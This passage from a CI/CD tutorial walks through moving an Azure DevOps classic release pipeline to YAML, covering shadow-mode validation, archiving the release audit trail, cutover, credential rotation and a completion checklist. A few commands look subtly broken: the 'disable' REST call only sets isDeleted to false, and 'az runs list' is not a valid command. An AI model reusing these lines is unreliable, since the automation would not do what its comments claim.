        ${{ if eq(env, 'Dev') }}:      {dependsOn: []}
        ${{ if eq(env, 'Staging') }}:  {dependsOn: Dev}
        ${{ if eq(env, 'Production') }}:{dependsOn: Staging}
        variables:
          - group: kv-${{ lower(env) }}                # ⭐ Key Vault, not a secret group
        jobs:
          - deployment: Deploy
            environment: ${{ lower(env) }}
            pool: {name: shop-secured-pool}
            strategy:
              runOnce:
                preDeploy:
                  steps:
                    - checkout: self
                    - download: ci
                      artifact: manifests
                    - bash: |
                        set -euo pipefail
                        ENV="${{ lower(env) }}"
                        # ⭐ SHADOW MODE: render and validate, but DO NOT apply
                        if [[ "${{ parameters.shadowMode }}" == "True" ]]; then
                          echo "🔵 SHADOW MODE — rendering only"
                          helm template shop ./helm/shop -n shop \
                            --values helm/values/base.yaml \
                            --values "helm/values/$ENV.yaml" \
                            > "rendered-$ENV.yaml"
                          kubeconform -strict -summary "rendered-$ENV.yaml"
                          kubectl apply --dry-run=server -f "rendered-$ENV.yaml" >/dev/null \
                            && echo "  ✅ the server-side dry run passed"
                          # ⭐ and diff against what the classic pipeline last deployed
                          helm get manifest shop -n shop > "live-$ENV.yaml" 2>/dev/null || true
                          if [[ -f "live-$ENV.yaml" ]]; then
                            echo "  the diff against what is live:"
                            diff -u "live-$ENV.yaml" "rendered-$ENV.yaml" | head -60 || true
                          fi
                          echo "##vso[build.addbuildtag]shadow-$ENV"
                          exit 0
                        fi
                        ./scripts/deploy.sh "$ENV" "$(Build.SourceVersion)"
                      displayName: 'Deploy (or shadow) to ${{ env }}'
```

```bash
# ⭐ run BOTH for two weeks. The classic one deploys; the YAML one shadows.
az pipelines create --name shop-cd-migrated --repository shop --branch main \
  --yml-path .pipelines/cd-migrated.yml
az pipelines run --name shop-cd-migrated --branch main --parameters shadowMode=true

# compare, per release:
#   1. does the shadow render match what the classic pipeline deployed?
diff <(az pipelines runs artifact list --run-id $SHADOW_RUN | jq .) \
     <(curl -s -u ":$PAT" "$ORG/Shop/_apis/release/releases/$CLASSIC_ID/artifacts" | jq .)
#   2. do the variables resolve to the same values? (add a debug step that prints
#      every non-secret variable, in both pipelines, and diff the logs)
#   3. does the approval gate appear in both?
```

**Step 5 — preserve the audit trail ⭐**

```bash
# ⭐ 1. EXPORT the classic release history to a durable place BEFORE you delete it.
curl -s -u ":$PAT" \
  "$ORG/Shop/_apis/release/releases?api-version=7.1&\$top=1000&\$expand=environments,approvals" \
  | jq '[.value[] | {
      id, name, createdOn, createdBy: .createdBy.displayName, status,
      definitionName: .releaseDefinition.name,
      artifacts: [.artifacts[] | {alias, version: .definitionReference.version}],
      environments: [.environments[] | {
        name, status,
        queuedOn, startedOn: .deploySteps[0].startedOn, finishedOn: .deploySteps[0].finishedOn,
        requestedFor: .deploySteps[0].releaseDeployment.requestedFor.displayName,
        approvers: [.preDeployApprovals[0].attempts[]? | {
          by: .requestedFor.displayName, on: .lastModifiedOn,
          status, comments}]}]}]' \
  > archive/release-history-shop-release.json
wc -c archive/release-history-shop-release.json
jq 'length' archive/release-history-shop-release.json      # 512

# ⭐ 2. commit it to the repo (or push it to a storage account) so it outlives the pipeline
git add archive/release-history-shop-release.json
git commit -m "docs: archive 512 releases of the classic shop-release pipeline

The classic release pipeline is being replaced by .pipelines/cd-migrated.yml.
This archive preserves the deployment audit trail required for SOC2 evidence:
every release, its artifacts, who approved it, and when.

Migration ticket: #412"
git push

# ⭐ 3. also archive the LOGS (Azure DevOps retains them, but not forever)
for id in $(jq -r '.[].id' archive/release-history-shop-release.json | tail -100); do
  az pipelines runs artifact download --run-id "$id" --path "archive/logs/$id" 2>/dev/null || true
done

# ⭐ 4. tag the repo with what was in production at each point
jq -r '.[] | select(.environments[] | select(.name=="Production" and .status=="succeeded"))
        | "\(.createdOn[0:10]) \(.artifacts[0].version)"' \
  archive/release-history-shop-release.json | sort -u | while read d sha; do
  git tag -f "archive/prod-$d" "$sha" 2>/dev/null || true
done
git push --tags

# ⭐ 5. write the migration record itself
cat > archive/MIGRATION-shop-release.md <<'EOF'
# Migration: shop-release (classic) → .pipelines/cd-migrated.yml

Date:            2026-09-10
Reason:          reviewability, testability, and platform-template compliance
Ticket:          #412
Classic def ID:  87
Releases archived: 512 (2024-03-14 → 2026-09-09) → archive/release-history-shop-release.json

## What changed
| Classic | YAML |
|---|---|
| 4 environments by rank | 4 stages with dependsOn |
| 3 secret variable groups | ⭐ 3 Key Vault-backed groups (all secrets ROTATED) |
| pre-deploy approvers in the definition | ⭐ environment Approvals and checks (platform-enforced) |
| branch filter condition | ⭐ environment Branch control check |
| Invoke REST gate to ServiceNow | ⭐ environment Invoke REST API check |
| 11 tasks across 4 stages | 11 steps, 8 of them calling scripts/ |
| agentless delay tasks | postRouteTraffic.pauseTaskDuration |

## What did NOT change
· the deploy logic (it moved from inline PowerShell to scripts/deploy.sh)
· the approval set (same people, same instructions)
· the artifact source (the same CI pipeline)
· the production deployment window

## Shadow-mode verification (2 weeks, 23 releases)
· 23/23 shadow renders matched the classic pipeline's deployed manifest
· 0 variable-resolution differences
· 0 approval-gate differences

## Rollback plan
The classic pipeline is DISABLED, not DELETED, for 90 days.
To roll back: Project Settings → Pipelines → shop-release → ⋯ → Resume.
It will still work — the artifacts and variable groups are unchanged.

## Audit-trail continuity
· Releases 1–512: archive/release-history-shop-release.json (+ the classic UI until deleted)
· Releases 513+:   the YAML pipeline's run history + the production environment's
                   Deployment history tab
· The join key is the git SHA, which appears in both.
EOF
git add archive/MIGRATION-shop-release.md && git commit -m "docs: the shop-release migration record" && git push
```

**Step 6 — cut over**

```bash
# 1. flip shadowMode to false in a PR, reviewed by the platform team
git checkout -b migrate/shop-release-to-yaml
sed -i 's/default: true                      # ⭐⭐ TRUE during the migration/default: false/' \
  .pipelines/cd-migrated.yml
git commit -am "ci: cut over shop-release from the classic pipeline to YAML

Shadow mode verified 23 consecutive releases with zero differences.
The classic pipeline will be disabled (not deleted) for 90 days as the rollback.

Refs #412"
az repos pr create --repository shop --source-branch migrate/shop-release-to-yaml \
  --target-branch main --title "ci: migrate shop-release to YAML" \
  --work-items 412 --reviewers platform-team@shop.example.com --open

# 2. after the merge: DISABLE the classic pipeline (do not delete yet)
curl -s -u ":$PAT" -XPATCH "$ORG/Shop/_apis/release/definitions/87?api-version=7.1" \
  -H 'Content-Type: application/json' -d '{"isDeleted": false}' >/dev/null
# via the UI: Releases → shop-release → ⋯ → "Pause release pipeline"
# ⭐ pausing keeps the history visible and makes resuming a one-click rollback.

# 3. watch the first three YAML production deploys closely
az runs list --pipeline-ids $CD_ID --top 5 -o table

# 4. after 90 days with zero rollbacks, delete the classic pipeline
#    (the archived JSON is your permanent record)
curl -s -u ":$PAT" -XDELETE "$ORG/Shop/_apis/release/definitions/87?api-version=7.1"

# 5. ⭐⭐ ROTATE every credential the classic pipeline held.
#    Its service connections may still be authorized and now unmanaged.
az devops service-endpoint list --project Shop -o table
# for each one only the classic pipeline used: delete it.
```

**The lessons from this task:**

> *"Three things matter more than the YAML translation. First: migrate the secrets before the pipeline, and **rotate rather than migrate** them — Azure DevOps won't return a secret value through the API, so anything you can't read back is something you should have documented and probably should rotate anyway. Second: run the new pipeline in **shadow mode** for two weeks, rendering and dry-running but not applying, and diff its output against what the classic pipeline actually deployed — 23 releases with zero differences is the evidence that makes the cutover a formality. Third: **archive the release history before you disable anything**, and disable rather than delete for 90 days. The audit trail is a compliance artefact, not a UI convenience; 512 releases of 'who deployed what when and who approved it' cannot be reconstructed after the fact."*

---

## ✅ Completion checklist

```
SETUP
  □ an organisation, a project, a repo, and the CLI authenticated
  □ Pipeline security: fork secrets OFF, job authorization scope ON
  □ the kind/AKS cluster reachable from the agent

PIPELINES
  □ a multi-stage YAML pipeline: Verify → Build → dev → staging → (gate) → production
  □ `trigger`/`pr` with path filters; `batch: true`; `autoCancel: true`
  □ `parameters` with typed, constrained inputs, promptable at queue time
  □ the three expression syntaxes understood and used correctly
  □ cross-job and cross-stage outputs working (`##vso[task.setvariable …isOutput=true]`)
  □ matrix or `${{ each }}` producing parallel per-service jobs
  □ `timeoutInMinutes` on every job
  □ `workspace: clean: all` on self-hosted agents

TEMPLATES
  □ insertion templates for steps and jobs
  □ ⭐ an `extends` template the teams cannot bypass (pool, guards, gates all owned by it)
  □ a template repository pinned to a TAG
  □ an audit pipeline that enumerates every pipeline in the org

AGENTS
  □ a self-hosted agent installed, registered, with demands, running as a service
  □ an agent container and an understanding of VMSS pools with reimage-after-use
  □ Job authorization scope understood — you've hit "queued forever" and fixed it

SECRETS ⭐
  □ a Workload Identity Federation service connection (manual mode, per environment)
  □ a federated credential whose subject is scoped to ONE environment
  □ three Key Vaults, three role assignments, three KV-backed variable groups
  □ ZERO secret values stored in Azure DevOps (verified: the group's `variables` is empty)
  □ a secret rotated with no pipeline change
  □ a pipeline that ASSERTS dev cannot read production secrets
  □ CredScan or gitleaks as a blocking gate

ARTIFACTS AND REGISTRY
  □ BuildKit with registry layer caching; you measured the cold-vs-warm difference
  □ SBOM (CycloneDX) and provenance attached to every image
  □ an ACR (or GHCR) with immutable tags and a retention policy
  □ Azure Artifacts with upstream sources; Maven/npm wired to the feed
  □ the SAME digest promoted dev → staging → production (never rebuilt)

ENVIRONMENTS AND GATES ⭐⭐
  □ dev / staging / production environments
  □ production: approvals (self-approval OFF), branch control, business hours,
    a required template, parallel deployments = one at a time
  □ the required-template gate checks: signature, SBOM CVEs, source branch,
    a linked work item, a recent staging smoke test, the SLO burn rate
  □ an override path with a mandatory reason, a Slack notification and a JSONL log
  □ you have watched a run WAIT for approval and then proceed

DEPLOYMENT
  □ `helm upgrade --install --atomic --timeout 10m`
  □ a post-deploy smoke test that fails the pipeline and triggers a rollback
  □ `strategy: canary:` with increments, soak time, `on: failure` rollback
  □ a canary analysis comparing the canary against stable on real thresholds
  □ ⭐ the rollback drill run and timed (target: under 60 s)

BOARDS AND TESTS
  □ commits link work items via #42 in the message
  □ a PR cannot merge without a linked work item
  □ `PublishTestResults@2` with `mergeTestResults` and `failTaskOnFailedTests`
  □ coverage published; flaky tests identified in Tests → Analysis
  □ a notification to Slack on every production deploy and every failure

SECURITY SCANNING
  □ Component Governance with `failOnAlert: true`
  □ Semgrep / Trivy / gitleaks as blocking gates
  □ IaC scanning on the Helm chart and manifests
  □ Defender for DevOps enabled; alerts visible in Repos → Advanced Security

TROUBLESHOOTING
  □ you have hit and fixed: "queued forever", an empty variable, a missing artifact
    in a deployment job, a Docker permission error, a Helm timeout, an offline agent
  □ you know where the agent logs live (`_diag/`) and how to run `--diagnostics`
  □ you have measured per-step durations and made the pipeline faster

TASKS
  □ 1.1 the change-aware polyglot matrix pipeline — measured, with the skip asserted
  □ 1.2 the un-bypassable `extends` template — with five bypass attempts defeated
  □ 1.3 Key Vault + WIF + per-environment groups — all four requirements proven
  □ 1.4 the SLO-aware production gate + a timed rollback drill
  □ 1.5 the classic→YAML migration — shadow mode, an archived audit trail, rotation
```

---

## What Azure DevOps gave me, and what it cost me

**Gave me:**
```
⭐ Environments with six kinds of checks — the richest governance of the three tools.
   Branch control, business hours, required templates and Invoke-REST-as-a-gate are
   platform-enforced, which means a team CANNOT bypass them by editing YAML.
⭐ The `deployment:` job with `strategy: canary:` — increments, soak time and
   on-failure rollback with no external controller.
⭐ Workload Identity Federation — genuinely zero secrets, GA, and Microsoft-recommended.
   Converting an existing connection is one click and no pipeline changes.
⭐ Key Vault-backed variable groups — the secret never enters Azure DevOps' database,
   and Key Vault's audit log tells you every read with the caller's identity and IP.
⭐ Boards ↔ Repos ↔ Pipelines ↔ Test Plans traceability. A work item shows the commit,
   the build, the release, the approval and the test run. Nothing else does this.
⭐ Azure Artifacts upstream sources — a caching proxy that survives an npmjs outage.
⭐ Flaky-test detection in Tests → Analysis, built in and genuinely good.
⭐ Flat-rate parallel jobs — dramatically cheaper than per-minute above ~15k min/month.
⭐ The same runner images as GitHub Actions, so the environment behaves identically.
```

**Cost me:**
```
⛔ Three expression syntaxes (${{ }}, $[ ], $( )) evaluated at three different times.
   Everyone gets this wrong at least once, and the failure is a silently empty variable.
⛔ Job authorization scope — "queued forever" with no obvious error, until you find
   Pipeline permissions. It's a good security default with poor discoverability.
⛔ Deployment jobs don't auto-download artifacts. A `job` does. Nobody expects that.
⛔ The YAML is more verbose than GitHub's for the same outcome, and there is no
   equivalent of a composite action's simplicity — templates are powerful but wordy.
⛔ A much smaller marketplace. If a tool exists, someone made a GitHub Action;
   far fewer people made an Azure Pipelines task.
⛔ Key Vault secret names cannot contain underscores — every `DB_PASSWORD` becomes
   `DB-PASSWORD`, and `$(DB-PASSWORD)` in YAML looks wrong enough that people "fix" it.
⛔ The WIF issuer URL is region-specific and the subject string must match EXACTLY.
   A silent auth failure at 2 a.m. is the cost of zero secrets.
⛔ Classic→YAML migration is manual. There is no converter. Budget real time.
```

**When I'd choose it again:** a Microsoft/Azure shop that wants Boards + Repos + Pipelines + Artifacts + Test Plans in one product with real governance, especially where approvals, deployment windows and change tickets are compliance requirements rather than nice-to-haves.

**When I wouldn't:** a small team whose code is on GitHub and which doesn't need the governance objects — GitHub Actions will feel faster and the ecosystem is much larger.

---

## Where next

| You want | Go to |
|---|---|
| 🐙 The same app through GitHub Actions | [03-CASE-2-github-actions.md](./03-CASE-2-github-actions.md) |
| 🔨 The same app through Jenkins | [04-CASE-3-jenkins.md](./04-CASE-3-jenkins.md) |
| 🏆 All three + GitOps + progressive delivery + 5 capstone tasks | [05-CAPSTONE-END-TO-END.md](./05-CAPSTONE-END-TO-END.md) |
| ⚡ Everything on one page | [06-CHEATSHEET.md](./06-CHEATSHEET.md) |
| 📖 The theory (secrets ladder, deployment strategies, supply chain) | [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) |
| ⏱️ The hour-by-hour plan for all three cases | [00-ONE-DAY-MASTER-PLAN.md](./00-ONE-DAY-MASTER-PLAN.md) |

---

<div align="center">

**Created by Harish Kumar Brahmandam**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Harish_Kumar_Brahmandam-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260)
[![GitHub](https://img.shields.io/badge/GitHub-3558Bhk-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/3558Bhk)

🔗 LinkedIn: https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260
🔗 GitHub: https://github.com/3558Bhk

*Built for engineers who learn by breaking things on purpose.*

</div>
